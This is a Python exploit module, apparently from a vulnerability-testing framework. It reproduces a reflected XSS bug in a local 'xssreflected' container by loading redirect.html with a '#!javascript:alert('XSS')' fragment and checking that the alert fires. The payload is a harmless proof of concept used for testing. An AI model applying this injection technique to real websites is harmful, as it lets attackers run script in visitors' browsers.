from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
      'Name' :        'ReflectedXSSExploit',
      'Description' : "Example of reflected XSS injection (example is taken from Twitter fix history).",
      'References' :  [["empty"]],
      'Target' :      "xssreflected",
      'Container': 'ubuntu-node',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'ReflectedXSS'
    }

    def runExploit(self):
        w = self.wrapper
        w.navigate("http://localhost:8888/redirect.html")
        w.navigate("http://localhost:8888/redirect.html?#!javascript:alert('XSS')")
        alert_text = w.handle_alert()
        self.assertIn("XSS", alert_text, "Exploit didn't work!")
